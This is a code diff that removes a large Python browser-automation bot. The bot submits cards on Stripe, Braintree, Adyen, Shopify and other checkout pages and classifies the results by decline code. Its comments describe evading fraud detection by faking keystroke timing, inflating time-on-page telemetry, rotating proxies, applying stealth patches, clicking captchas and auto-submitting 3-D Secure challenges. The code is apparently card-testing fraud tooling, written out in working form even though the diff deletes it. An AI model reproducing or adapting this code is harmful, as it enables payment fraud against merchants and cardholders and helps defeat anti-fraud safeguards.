@@ -7,8 +7,6 @@ import requests
 import aiohttp
 from datetime import datetime
 from typing import Dict, List, Optional
-from playwright.async_api import async_playwright, Page, Route, Request, Frame
-from playwright_stealth import Stealth
 import aiohttp
 from curl_cffi import requests as cffi_requests
 from dotenv import load_dotenv
@@ -276,413 +274,6 @@ class ResponseHandler:
         return None
 
 # ============= BASE AUTOFILL =============
-class BaseAutofill:
-    def __init__(self, page: Page, card: Dict = None, name: str = None, email: str = None, address: Dict = None):
-        self.page = page
-        self.real_card = card
-        self.name = name or RandomData.get_name()
-        self.email = email or RandomData.get_email()
-        self.address = address or {"line1": "123 Main St", "city": "New York", "state": "NY", "zip": "10001", "country": "US"}
-        
-        # 1% CODER: Real-Time Keystroke Telemetry Synchronization
-        # We used to type 4242424242424242 and replace it in the network payload.
-        # But Stripe's JS sends telemetry logging the BIN (first 6 digits) the user TYPES.
-        # If we type 424242 (Visa) but send 545454 (Mastercard) in the packet, we get flagged for fraud!
-        # Now, we physically type the REAL card to ensure perfectly valid telemetry.
-        if card:
-            self.masked_card = card['card']
-            self.masked_expiry = f"{card['month']}/{card['year'][-2:]}"
-            self.masked_cvv = card['cvv']
-        else:
-            self.masked_card = "4242424242424242"
-            self.masked_expiry = "01/30"
-            self.masked_cvv = "123"
-        self.response = ResponseHandler()
-        self.cursor = GhostCursor(page)
-    
-    async def enable_card_replace(self, real_card: Dict):
-        self.real_card = real_card
-        await self.response.setup(self.page)
-        await self._setup_intercept()
-        
-    async def _setup_intercept(self):
-        async def intercept(route: Route, request: Request):
-            url = request.url.lower()
-            targets = [
-                '/payment_intents', '/setup_intents', '/confirm', 'api.stripe.com/v1/tokens', 'api.stripe.com/v1/sources',
-                'braintreegateway.com/merchants/', 'adyen.com/checkoutshopper/', 'deposit.us.shopifycs.com/sessions',
-                'flex.cybersource.com/flex/v1/tokens', 'api2.authorize.net/xml/v1/request.api', 'api.authorize.net'
-            ]
-            if request.method == 'POST' and any(k in url for k in targets):
-                if request.post_data:
-                    new_data = self._replace(request.post_data)
-                    await route.continue_(post_data=new_data)
-                    return
-            await route.continue_()
-        try:
-            await self.page.route("**/*", intercept)
-        except: pass
-    
-    def _replace(self, data: str) -> str:
-        if not self.real_card: return data
-        
-        # 1% CODER: Behavioral "Time On Page" Spoofing
-        # If the bot fills the page in 2.5 seconds, Stripe's JS sends "time_on_page=2500"
-        # We aggressively inflate this to 45-95 seconds to look like a slow human typist
-        if "time_on_page=" in data:
-            import re
-            fake_time = str(random.randint(45000, 95000))
-            data = re.sub(r'time_on_page=\d+', f'time_on_page={fake_time}', data)
-            
-        return data
-
-    async def human_type(self, element, value: str):
-        try:
-            # 1% CODER: IFrame Teleport Bug Patch
-            frame = await element.owner_frame()
-            main_frame = self.page.main_frame
-            if frame and frame != main_frame:
-                iframe_element = await frame.frame_element()
-                await self.cursor.click_iframe_element(iframe_element, element)
-            else:
-                await self.cursor.click(element)
-                
-            await element.focus(timeout=2000)
-            
-            # 1% CODER: True Keystroke Dynamics Engine
-            # Stripe's risk AI maps "Hold Time" (keydown -> keyup) and "Flight Time" (keyup -> next keydown).
-            # Standard bot tools use a flat delay which is instantly flagged as synthetic.
-            # We decouple the hold and flight times to completely spoof a human typist cadence.
-            for char in value:
-                hold_time = random.uniform(0.015, 0.065) # 15ms to 65ms physical key press duration
-                flight_time = random.uniform(0.02, 0.12) # 20ms to 120ms finger travel distance
-                
-                await self.page.keyboard.down(char)
-                await asyncio.sleep(hold_time)
-                await self.page.keyboard.up(char)
-                await asyncio.sleep(flight_time)
-                
-        except:
-            pass
-    
-    async def fill_card_number(self, value: str):
-        selectors = ['#cardNumber','[name="cardNumber"]','[autocomplete="cc-number"]','[data-elements-stable-field-name="cardNumber"]',
-                     'input[placeholder*="Card number"]','input[placeholder*="card number"]','input[aria-label*="Card number"]',
-                     '[class*="CardNumberInput"] input','input[name="number"]','input[id*="card-number"]','[data-stripe="number"]',
-                     '.card-number','#card-number','input[placeholder*="0000"]','input[data-frames="card-number"]']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_expiry(self, value: str):
-        selectors = ['#cardExpiry','[name="cardExpiry"]','[autocomplete="cc-exp"]','[data-elements-stable-field-name="cardExpiry"]',
-                     'input[placeholder*="MM / YY"]','input[placeholder*="MM/YY"]','input[placeholder*="MM"]','[class*="CardExpiry"] input',
-                     'input[name="expiry"]','#expiry','input[placeholder*="expir"]','input[data-frames="expiry-date"]']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_cvv(self, value: str):
-        selectors = ['#cardCvc','[name="cardCvc"]','[autocomplete="cc-csc"]','[data-elements-stable-field-name="cardCvc"]',
-                     'input[placeholder*="CVC"]','input[placeholder*="CVV"]','[class*="CardCvc"] input','input[name="cvc"]','#cvc',
-                     'input[placeholder*="security code"]','input[data-frames="cvv"]']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_name(self, value: str):
-        selectors = ['#billingName','[name="billingName"]','[autocomplete="cc-name"]','input[placeholder*="Name on card"]',
-                     'input[name="name"]','#cardholderName','[name="cardholderName"]','#name','input[data-frames="name"]']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_email(self, value: str):
-        selectors = ['input[type="email"]','input[name*="email"]','input[autocomplete="email"]','input[placeholder*="email"]','#email','[name="email"]']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_phone(self, value: str):
-        selectors = ['#billingPhone','[name="billingPhone"]','input[autocomplete="tel"]','#phone','[name="phone"]','input[placeholder*="phone"]']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_address(self, value: str):
-        selectors = ['#billingAddressLine1','[name="billingAddressLine1"]','input[autocomplete="address-line1"]','#address-line1',
-                     '[name="address_line1"]','#address','[name="address"]','#billingAddress']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_city(self, value: str):
-        selectors = ['#billingLocality','[name="billingLocality"]','input[autocomplete="address-level2"]','#city','[name="city"]','#billingCity']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_zip(self, value: str):
-        selectors = ['#billingPostalCode','[name="billingPostalCode"]','input[autocomplete="postal-code"]','#zip','[name="zip"]','#postalCode']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await self.human_type(el, value)
-                    return True
-            except: continue
-        return False
-    
-    async def fill_country(self, value: str):
-        selectors = ['#billingCountry','[name="billingCountry"]','select[autocomplete="country"]','#country','[name="country"]']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el:
-                    await self.cursor.click(el) # Simulate tap to open native mobile picker
-                    await asyncio.sleep(0.5)
-                    await el.select_option(value)
-                    return True
-            except: continue
-        return False
-    
-    async def click_submit(self) -> bool:
-        selectors = [
-            '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]', '[data-testid="hosted-payment-submit-button"]',
-            '.pay-button', '#submit', '#pay-button', 'input[type="submit"]',
-            'button:has-text("Pay")', 'button:has-text("Submit")', 'button:has-text("Complete")',
-            'button:has-text("Buy")', 'button:has-text("Donate")', 'button:has-text("Subscribe")',
-            'button:has-text("Order")', 'button:has-text("Checkout")', 'button:has-text("Start")',
-            'button:has-text("Save")', 'button:has-text("Add")', 'button:has-text("Trial")',
-            'button:has-text("Continue")', '[data-action="submit"]'
-        ]
-        
-        for sel in selectors:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible() and await btn.is_enabled():
-                    # 1% CODER: Use GhostCursor to click the submit button naturally
-                    await self.cursor.click(btn)
-                    return True
-            except: continue
-            
-        # 1% CODER: Deep IFrame Submit Button Scanning
-        # Stripe Payment Elements often embed the Pay button inside the secure iframe.
-        for iframe in self.page.frames:
-            if iframe == self.page.main_frame: continue
-            for sel in selectors:
-                try:
-                    btn = await iframe.query_selector(sel)
-                    if btn and await btn.is_visible() and await btn.is_enabled():
-                        iframe_element = await iframe.frame_element()
-                        await self.cursor.click_iframe_element(iframe_element, btn)
-                        return True
-                except: continue
-            
-        # Fallback: Press Enter globally on the page to trigger form submission
-        try:
-            await self.page.keyboard.press('Enter')
-            await asyncio.sleep(1)
-            return True
-        except: pass
-        
-        return False
-    
-    async def get_result(self) -> Dict:
-        try:
-            await asyncio.wait_for(self.response.finished_event.wait(), timeout=6.0)
-        except asyncio.TimeoutError:
-            pass
-            
-        res = {'success': False, 'decline_code': 'unknown'}
-        if self.response.amount: res['amount'] = self.response.amount
-            
-        if self.response.is_success: 
-            res['success'] = True
-            res['decline_code'] = None
-            return res
-            
-        if self.response.decline_code: 
-            res['success'] = False
-            res['decline_code'] = self.response.decline_code
-            return res
-            
-        url = self.page.url
-        res['final_url'] = url
-        
-        if any(k in url.lower() for k in ['receipt','thank_you','success']):
-            res['success'] = True
-            res['decline_code'] = None
-            return res
-            
-        try:
-            html = await self.page.content()
-            h = html.lower()
-            if 'insufficient funds' in h: res['decline_code'] = 'insufficient_funds'
-            elif 'expired card' in h: res['decline_code'] = 'expired_card'
-            elif 'cvv' in h and 'incorrect' in h: res['decline_code'] = 'incorrect_cvv'
-            elif 'declined' in h: res['decline_code'] = 'generic_decline'
-            elif 'do not honor' in h: res['decline_code'] = 'do_not_honor'
-        except: pass
-        return res
-    
-    async def detect_3ds(self) -> bool:
-        try:
-            iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"], iframe[src*="authenticate"]')
-            for iframe in iframes:
-                if await iframe.is_visible(): return True
-            text = await self.page.text_content('body')
-            if text and any(x in text for x in ['3D Secure','Authentication','Verified by Visa','Mastercard SecureCode']):
-                return True
-        except: pass
-        return False
-    
-    async def handle_3ds(self):
-        if not await self.detect_3ds(): return False
-        try:
-            form = await self.page.query_selector('form')
-            if form:
-                await form.evaluate('form => form.submit()')
-                return True
-            btn = await self.page.query_selector('button:has-text("Continue"), button:has-text("Complete"), button:has-text("Submit")')
-            if btn:
-                await self.cursor.click(btn)
-                return True
-            iframes = await self.page.query_selector_all('iframe')
-            for iframe_element in iframes:
-                try:
-                    frame = await iframe_element.content_frame()
-                    if frame:
-                        btn2 = frame.locator('button[type="submit"], button:has-text("Continue")').first
-                        if await btn2.is_visible():
-                            await self.cursor.click_iframe_element(iframe_element, btn2)
-                            return True
-                except: pass
-        except: pass
-        return False
-    
-    async def detect_captcha(self) -> bool:
-        try:
-            iframes = await self.page.query_selector_all('iframe[src*="hcaptcha"], iframe[src*="recaptcha"], iframe[src*="turnstile"]')
-            for iframe in iframes:
-                if await iframe.is_visible(): return True
-        except: pass
-        return False
-    
-    async def solve_captcha(self):
-        if not await self.detect_captcha(): return False
-        try:
-            iframe_element = await self.page.query_selector('iframe[src*="hcaptcha.com"]')
-            if iframe_element:
-                frame = await iframe_element.content_frame()
-                cb = frame.locator('#checkbox').first if frame else None
-                if cb and await cb.is_visible():
-                    await self.cursor.click_iframe_element(iframe_element, cb)
-                    await asyncio.sleep(3)
-                    return True
-        except: pass
-        try:
-            iframe_element = await self.page.query_selector('iframe[src*="recaptcha"]')
-            if iframe_element:
-                frame = await iframe_element.content_frame()
-                cb = frame.locator('.recaptcha-checkbox-border').first if frame else None
-                if cb and await cb.is_visible():
-                    await self.cursor.click_iframe_element(iframe_element, cb)
-                    await asyncio.sleep(3)
-                    return True
-        except: pass
-        try:
-            iframe_element = await self.page.query_selector('iframe[src*="turnstile"]')
-            if iframe_element:
-                frame = await iframe_element.content_frame()
-                cb = frame.locator('body').first if frame else None
-                if cb and await cb.is_visible():
-                    await self.cursor.click_iframe_element(iframe_element, cb)
-                    await asyncio.sleep(3)
-                    return True
-        except: pass
-        return False
-    
-    async def find_frame(self, names: List[str], srcs: List[str]) -> Optional[Frame]:
-        try:
-            iframes = await self.page.query_selector_all('iframe')
-            for iframe in iframes:
-                name = await iframe.get_attribute('name') or ''
-                src = await iframe.get_attribute('src') or ''
-                for n in names:
-                    if n in name:
-                        f = await iframe.content_frame()
-                        if f: return f
-                for s in srcs:
-                    if s in src:
-                        f = await iframe.content_frame()
-                        if f: return f
-            for f in self.page.frames:
-                for n in names:
-                    if n in f.name: return f
-                for s in srcs:
-                    if s in f.url: return f
-        except: pass
-        return None
-    
-    async def click_card_tab(self):
-        selectors = ['button:has-text("Card")','[role="tab"]:has-text("Card")','[data-testid="card-tab"]',
-                     'input[value="card"]','label:has-text("Card")','div[role="button"]:has-text("Card")']
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await el.click()
-                    await asyncio.sleep(1)
-                    return True
-            except: continue
-        radio = await self.page.query_selector('input[type="radio"][value="card"]')
-        if radio:
-            await radio.click()
-            await asyncio.sleep(1)
-            return True
-        return False
-
 class ProxyManager:
     db_pool = None
 
@@ -958,337 +549,6 @@ class CardGenerator:
 
 
 # ============= AUTOFILL ENGINES =============
-class StripeV1_NormalForm(BaseAutofill):
-    async def fill(self):
-        await self.fill_email(self.email)
-        await self.fill_card_number(self.masked_card)
-        await self.fill_expiry(self.masked_expiry)
-        await self.fill_cvv(self.masked_cvv)
-        await self.fill_name(self.name)
-        await self.fill_address(self.address['line1'])
-        await self.fill_zip(self.address['zip'])
-        await asyncio.sleep(1)
-
-class StripeV2_ElementsIframe(BaseAutofill):
-    async def fill(self):
-        await self.click_card_tab()
-        
-        # 1% CODER: Multi-Iframe Filling Protocol
-        # Stripe can use 1 iframe for everything OR 3 separate iframes for Card, Expiry, and CVC.
-        # We must scan ALL Stripe iframes to ensure we don't miss fields.
-        iframes = await self.page.query_selector_all('iframe')
-        for iframe_element in iframes:
-            try:
-                src = await iframe_element.get_attribute('src') or ''
-                name = await iframe_element.get_attribute('name') or ''
-                if 'stripe.com' in src or '__privateStripeFrame' in name or 'stripe' in name.lower():
-                    frame = await iframe_element.content_frame()
-                    if not frame: continue
-                    
-                    ci = await frame.query_selector('input[placeholder*="card number"], input[autocomplete="cc-number"], input[name="cardnumber"]')
-                    if ci and await ci.is_visible(): await self.human_type(ci, self.masked_card)
-                    
-                    ei = await frame.query_selector('input[placeholder*="MM/YY"], input[autocomplete="cc-exp"], input[name="exp-date"]')
-                    if ei and await ei.is_visible(): await self.human_type(ei, self.masked_expiry)
-                    
-                    cvi = await frame.query_selector('input[placeholder*="CVC"], input[autocomplete="cc-csc"], input[name="cvc"]')
-                    if cvi and await cvi.is_visible(): await self.human_type(cvi, self.masked_cvv)
-                    
-                    # Some Elements also require Zip inside the iframe
-                    zi = await frame.query_selector('input[placeholder*="ZIP"], input[autocomplete="postal-code"]')
-                    if zi and await zi.is_visible(): await self.human_type(zi, self.address['zip'])
-            except: pass
-            
-        await self.fill_name(self.name)
-        await self.fill_email(self.email)
-        await self.fill_address(self.address['line1'])
-        await self.fill_city(self.address['city'])
-        await self.fill_zip(self.address['zip'])
-        await self.fill_country(self.address['country'])
-        await asyncio.sleep(1)
-
-class StripeV3_Modal(BaseAutofill):
-    async def fill(self):
-        modal = await self.page.query_selector('[role="dialog"], [class*="modal"], [class*="Modal"]')
-        if not modal: return await StripeV2_ElementsIframe(self.page, self.card, self.name, self.email, self.address).fill()
-        ci = await modal.query_selector('#cardNumber, [name="cardNumber"], input[placeholder*="card number"]')
-        if ci: await self.human_type(ci, self.masked_card)
-        ei = await modal.query_selector('#cardExpiry, [name="cardExpiry"], input[placeholder*="MM/YY"]')
-        if ei: await self.human_type(ei, self.masked_expiry)
-        cvi = await modal.query_selector('#cardCvc, [name="cardCvc"], input[placeholder*="CVC"]')
-        if cvi: await self.human_type(cvi, self.masked_cvv)
-        await self.fill_name(self.name)
-        await self.fill_email(self.email)
-        await self.fill_address(self.address['line1'])
-        await self.fill_city(self.address['city'])
-        await self.fill_zip(self.address['zip'])
-        await self.fill_country(self.address['country'])
-        await asyncio.sleep(1)
-
-class StripeV3_Checkout(BaseAutofill):
-    async def fill(self):
-        await self.fill_email(self.email)
-        await self.click_card_tab()
-        await self.fill_card_number(self.masked_card)
-        await self.fill_expiry(self.masked_expiry)
-        await self.fill_cvv(self.masked_cvv)
-        await self.fill_name(self.name)
-        await self.fill_address(self.address['line1'])
-        await self.fill_city(self.address['city'])
-        await self.fill_zip(self.address['zip'])
-        await self.fill_country(self.address['country'])
-        await asyncio.sleep(1)
-
-class StripeV4_Invoice(BaseAutofill):
-    async def fill(self):
-        cs = await self.page.query_selector('button:has-text("Card"), [class*="Card"][class*="Section"]')
-        if cs:
-            await self.cursor.click(cs)
-            await asyncio.sleep(1)
-        iframes = await self.page.query_selector_all('iframe')
-        for iframe in iframes:
-            try:
-                f = await iframe.content_frame()
-                if f:
-                    ci = await f.query_selector('input[placeholder*="card number"], input[autocomplete="cc-number"]')
-                    if ci: await self.human_type(ci, self.masked_card)
-                    ei = await f.query_selector('input[placeholder*="MM/YY"], input[autocomplete="cc-exp"]')
-                    if ei: await self.human_type(ei, self.masked_expiry)
-                    cvi = await f.query_selector('input[placeholder*="CVC"], input[autocomplete="cc-csc"]')
-                    if cvi: await self.human_type(cvi, self.masked_cvv)
-            except: pass
-        await self.fill_name(self.name)
-        await self.fill_email(self.email)
-        await self.fill_address(self.address['line1'])
-        await self.fill_city(self.address['city'])
-        await self.fill_zip(self.address['zip'])
-        await self.fill_country(self.address['country'])
-        await asyncio.sleep(1)
-
-class StripeV5_Embedded(BaseAutofill):
-    async def fill(self):
-        elements = await self.page.query_selector_all('[class*="StripeElement"], [class*="CardElement"]')
-        for el in elements:
-            try: await self.cursor.click(el)
-            except: pass
-        iframes = await self.page.query_selector_all('iframe')
-        for iframe in iframes:
-            try:
-                f = await iframe.content_frame()
-                if f:
-                    ci = await f.query_selector('input[placeholder*="card number"]')
-                    if ci: await self.human_type(ci, self.masked_card)
-                    ei = await f.query_selector('input[placeholder*="MM/YY"]')
-                    if ei: await self.human_type(ei, self.masked_expiry)
-                    cvi = await f.query_selector('input[placeholder*="CVC"]')
-                    if cvi: await self.human_type(cvi, self.masked_cvv)
-            except: pass
-        await self.fill_name(self.name)
-        await self.fill_email(self.email)
-        await self.fill_address(self.address['line1'])
-        await self.fill_city(self.address['city'])
-        await self.fill_zip(self.address['zip'])
-        await self.fill_country(self.address['country'])
-        await asyncio.sleep(1)
-
-class StripeV6_PaymentElement(BaseAutofill):
-    async def fill(self):
-        iframes = await self.page.query_selector_all('iframe')
-        for iframe in iframes:
-            try:
-                f = await iframe.content_frame()
-                if f:
-                    ci = await f.query_selector('input[placeholder*="card number"], input[autocomplete="cc-number"]')
-                    if ci: await self.human_type(ci, self.masked_card)
-                    ei = await f.query_selector('input[placeholder*="MM/YY"], input[autocomplete="cc-exp"]')
-                    if ei: await self.human_type(ei, self.masked_expiry)
-                    cvi = await f.query_selector('input[placeholder*="CVC"], input[autocomplete="cc-csc"]')
-                    if cvi: await self.human_type(cvi, self.masked_cvv)
-            except: pass
-        await self.fill_name(self.name)
-        await self.fill_email(self.email)
-        await self.fill_address(self.address['line1'])
-        await self.fill_city(self.address['city'])
-        await self.fill_zip(self.address['zip'])
-        await self.fill_country(self.address['country'])
-        await asyncio.sleep(1)
-
-class StripeV7_LinkAuth(BaseAutofill):
-    async def fill(self):
-        await StripeV2_ElementsIframe(self.page, self.real_card, self.name, self.email, self.address).fill()
-        link = await self.page.query_selector('button:has-text("Link"), [data-testid="link-auth"]')
-        if link:
-            await link.click()
-            await asyncio.sleep(1)
-            await self.fill_email(self.email)
-            submit = await self.page.query_selector('button[type="submit"]')
-            if submit: await submit.click()
-        await asyncio.sleep(0.5)
-
-# ============= NEW GATEWAY ENGINES =============
-class Braintree_HostedFields(BaseAutofill):
-    async def fill(self):
-        iframes = await self.page.query_selector_all('iframe[name*="braintree"]')
-        for iframe in iframes:
-            try:
-                f = await iframe.content_frame()
-                if f:
-                    ci = await f.query_selector('#credit-card-number')
-                    if ci: await self.human_type(ci, self.masked_card)
-                    ei = await f.query_selector('#expiration')
-                    if ei: await self.human_type(ei, self.masked_expiry)
-                    cvi = await f.query_selector('#cvv')
-                    if cvi: await self.human_type(cvi, self.masked_cvv)
-            except: pass
-        await self.fill_name(self.name)
-        await self.fill_email(self.email)
-        await self.fill_address(self.address['line1'])
-        await self.fill_zip(self.address['zip'])
-        await asyncio.sleep(1)
-
-class Adyen_DropIn(BaseAutofill):
-    async def fill(self):
-        ci = await self.page.query_selector('.adyen-checkout__card__cardNumber__input')
-        if ci: await self.human_type(ci, self.masked_card)
-        ei = await self.page.query_selector('.adyen-checkout__card__exp-date__input')
-        if ei: await self.human_type(ei, self.masked_expiry)
-        cvi = await self.page.query_selector('.adyen-checkout__card__cvc__input')
-        if cvi: await self.human_type(cvi, self.masked_cvv)
-        await self.fill_name(self.name)
-        await asyncio.sleep(1)
-
-class Shopify_Checkout(BaseAutofill):
-    async def fill(self):
-        await self.fill_email(self.email)
-        await self.fill_name(self.name)
-        await self.fill_address(self.address['line1'])
-        await self.fill_city(self.address['city'])
-        await self.fill_zip(self.address['zip'])
-        
-        # Shopify specific deep iframes
-        iframes = await self.page.query_selector_all('iframe[id*="card-fields"]')
-        for iframe in iframes:
-            try:
-                f = await iframe.content_frame()
-                if f:
-                    ci = await f.query_selector('#number')
-                    if ci: await self.human_type(ci, self.masked_card)
-                    ei = await f.query_selector('#expiry')
-                    if ei: await self.human_type(ei, self.masked_expiry)
-                    cvi = await f.query_selector('#verification_value')
-                    if cvi: await self.human_type(cvi, self.masked_cvv)
-            except: pass
-        await asyncio.sleep(1)
-
-class Cybersource_Microform(BaseAutofill):
-    async def fill(self):
-        await self.fill_name(self.name)
-        iframes = await self.page.query_selector_all('iframe[id*="flex-microform"]')
-        for iframe in iframes:
-            try:
-                f = await iframe.content_frame()
-                if f:
-                    ci = await f.query_selector('#cardNumber')
-                    if ci: await self.human_type(ci, self.masked_card)
-                    cvi = await f.query_selector('#securityCode')
-                    if cvi: await self.human_type(cvi, self.masked_cvv)
-            except: pass
-        await self.fill_expiry(self.masked_expiry)
-        await self.fill_address(self.address['line1'])
-        await self.fill_zip(self.address['zip'])
-        await asyncio.sleep(1)
-
-class AuthorizeNet_AcceptJS(BaseAutofill):
-    async def fill(self):
-        await self.fill_card_number(self.masked_card)
-        await self.fill_expiry(self.masked_expiry)
-        await self.fill_cvv(self.masked_cvv)
-        await self.fill_name(self.name)
-        await self.fill_email(self.email)
-        await self.fill_address(self.address['line1'])
-        await self.fill_zip(self.address['zip'])
-        await asyncio.sleep(1)
-
-class AutofillSelector:
-    @staticmethod
-    async def detect(page: Page, url: str):
-        url_lower = url.lower()
-        if 'invoice.stripe.com' in url_lower: return StripeV4_Invoice
-        if 'shopify.com' in url_lower or await page.query_selector('.step__sections') or await page.query_selector('[data-trekkie-id]'): return Shopify_Checkout
-        if await page.query_selector('iframe[name*="braintree"]'): return Braintree_HostedFields
-        if await page.query_selector('.adyen-checkout__card__cardNumber__input') or await page.query_selector('.adyen-checkout'): return Adyen_DropIn
-        if await page.query_selector('iframe[id*="flex-microform"]'): return Cybersource_Microform
-        if await page.query_selector('input[data-accept="cardNumber"]') or await page.query_selector('#AcceptJS'): return AuthorizeNet_AcceptJS
-        
-        if await page.query_selector('[class*="PaymentElement"]'): return StripeV6_PaymentElement
-        if await page.query_selector('button:has-text("Link")'): return StripeV7_LinkAuth
-        if await page.query_selector('[role="dialog"]'): return StripeV3_Modal
-        if await page.query_selector('iframe[name*="__privateStripeFrame"]'): return StripeV2_ElementsIframe
-        if await page.query_selector('[class*="StripeElement"]'): return StripeV5_Embedded
-        if await page.query_selector('#cardNumber, [name="cardNumber"]'): return StripeV1_NormalForm
-        return StripeV2_ElementsIframe
-
-class URLAnalyzer:
-    @staticmethod
-    async def analyze(user_id: int, page: Page, url: str) -> Dict:
-        result = {'merchant': 'Unknown', 'amount': None, 'cs_token': None, 'pk_key': None}
-        try:
-            html = await page.content()
-            cs_token = StripeAPIExtractor.extract_cs_live(url, html)
-            pk_key = StripeAPIExtractor.extract_pk_live(html)
-            result['cs_token'] = cs_token
-            result['pk_key'] = pk_key
-            
-            if StripeAPIExtractor.is_invoice_page(url):
-                invoice_amount = await StripeAPIExtractor.extract_invoice_amount(page)
-                if invoice_amount:
-                    result['amount'] = invoice_amount
-                    from urllib.parse import urlparse
-                    parsed = urlparse(url)
-                    hostname = parsed.netloc.replace('invoice.stripe.com', '').replace('www.', '').split('.')[0]
-                    if hostname: result['merchant'] = hostname.capitalize() if hostname else "Invoice"
-                    return result
-            
-            if cs_token and pk_key:
-                api_data = await StripeAPIExtractor.fetch_payment_data(user_id, cs_token, pk_key)
-                if api_data.get('success'):
-                    result['amount'] = api_data.get('amount')
-                    result['merchant'] = api_data.get('merchant')
-                    return result
-            
-            # 1% CODER: Setup Intent Detection (Zero-Auth Trials)
-            if 'seti_' in url or 'setup_intent' in url or 'seti_' in html:
-                result['amount'] = "Setup Intent ($0.00)"
-                
-            merchant = await page.evaluate('''() => {
-                const m = document.querySelector('meta[property="og:site_name"]');
-                return m ? m.content : document.title.split(' | ')[0];
-            }''')
-            if merchant: result['merchant'] = merchant.strip()
-            
-            if not result['amount']:
-                amount = await page.evaluate('''() => {
-                    const el = document.querySelector('.price, .amount, [data-amount], #total, .total, .order-summary, .Text-color--default.Text-fontSize--16.Text-fontWeight--500');
-                    return el ? (el.innerText || el.getAttribute('data-amount')) : null;
-                }''')
-                if amount:
-                    clean = amount.strip()
-                    # 1% CODER: Multi-currency text parsing (e.g. "$2.38 - 236 rs")
-                    # We specifically look for the dollar amount first to prevent grabbing the wrong currency
-                    usd_match = re.search(r'\$\s*([\d,]+\.?\d*)', clean)
-                    if usd_match:
-                        val = usd_match.group(1).replace(',', '')
-                        result['amount'] = f"${val}"
-                    elif len(clean) < 25:
-                        result['amount'] = clean
-                    else:
-                        m = re.search(r'[\$€£]?\s*([\d,]+\.?\d*)', clean)
-                        if m:
-                            val = m.group(1).replace(',', '')
-                            if '.' in val: result['amount'] = f"${val}"
-                            else: result['amount'] = f"${int(val)/100:.2f}"
-        except: pass
-        return result
 HARDWARE_SPOOF_SCRIPT = """
     Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
     window.chrome={runtime:{}};
@@ -1463,79 +723,6 @@ HARDWARE_SPOOF_SCRIPT = """
     fakeAudioContext(window.webkitAudioContext);
 """
 
-async def single_hit(browser, url: str, card: Dict, attempt: int, autofill_class, url_info, user_id: int) -> Dict:
-    start = time.time()
-    result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': url_info.get('amount'), 'merchant': url_info.get('merchant'), 'proxy_raw': None}
-    context = None
-    try:
-        # 1% CODER: Ephemeral Context per hit prevents fingerprint bleed
-        proxy_data = await ProxyManager.get_random(user_id)
-        playwright_proxy = None
-        if proxy_data:
-            result['proxy_raw'] = proxy_data['raw']
-            playwright_proxy = ProxyManager.format_for_playwright(proxy_data)
-
-        # Identify checkout type and inject pre-generated identity
-        proxy_url_str = proxy_data["server"] if proxy_data else None
-        address, proxy_timezone, proxy_locale = await RandomData.get_address_and_timezone(proxy_url_str)
-        name = RandomData.get_name()
-        email = RandomData.get_email()
-        
-        # 1% CODER: Mobile Hardware Emulation, Dynamic Locale & Sec-CH-UA Spoofing
-        # We enforce Android Chromium since the Playwright engine IS Chromium. 
-        # Spoofing iPhone Safari while sending Chromium Sec-CH-UA headers is an instant flag!
-        ua = "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
-        
-        context = await asyncio.wait_for(browser.new_context(
-            proxy=playwright_proxy,
-            ignore_https_errors=True
-        ), timeout=5.0)
-        
-        page = await context.new_page()
-        # 1% CODER: Apply Stealth even to the initial analyzer to avoid Cloudflare taint
-        await Stealth().apply_stealth_async(page)
-        
-        try:
-            await asyncio.wait_for(page.goto(url, timeout=15000, wait_until='domcontentloaded'), timeout=16.0)
-        except asyncio.TimeoutError:
-            raise Exception("Timeout 15000ms exceeded.")
-        await asyncio.sleep(0.5) # Let frame settle
-        
-        autofill = autofill_class(page, card, name, email, address)
-        await autofill.enable_card_replace(card)
-        await autofill.solve_captcha()
-        await autofill.fill()
-        
-        # 1% CODER: Human Transition Delay
-        # Simulate the physical time it takes a human finger to move from the keyboard (CVV) 
-        # to the submit button on a mobile screen.
-        await asyncio.sleep(random.uniform(0.3, 0.9))
-        
-        if not await autofill.click_submit():
-            result['error'] = 'Submit button not found'
-            result['decline_code'] = 'submit_button_not_found'
-            return result
-        if await autofill.detect_3ds():
-            await autofill.handle_3ds()
-            
-        response = await autofill.get_result()
-        result['response_time'] = time.time() - start
-        result['success'] = response.get('success', False)
-        result['decline_code'] = response.get('decline_code')
-        if response.get('amount'):
-            result['amount'] = response.get('amount')
-        if response.get('final_url'):
-            result['final_url'] = response.get('final_url')
-    except Exception as e:
-        result['error'] = str(e)
